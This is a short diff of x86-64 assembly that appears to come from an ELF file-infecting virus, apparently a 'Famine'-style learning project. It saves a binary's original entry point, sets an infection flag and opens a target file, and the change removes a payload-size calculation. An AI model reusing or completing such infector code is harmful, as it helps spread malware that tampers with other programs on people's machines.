@@ -77,20 +77,13 @@ number:
 	elfh db 0x7F, 'ELF'
 	exec dw 7
 entry_point:
+
 	mov		rax, [rel buf0 + 0x18]
 	mov		[rel old_e], rax
-
 
 	mov		al, [rel famineb]
 	mov		[rel famined], al
 	mov		[rel famineb], byte 1
-
-
-
-	lea		rdi, [rel famine]
-	lea		rax, [rel .true_end]
-	sub		rax, rdi
-
 
 	mov		rax, 2
 	lea		rdi, [rel file]
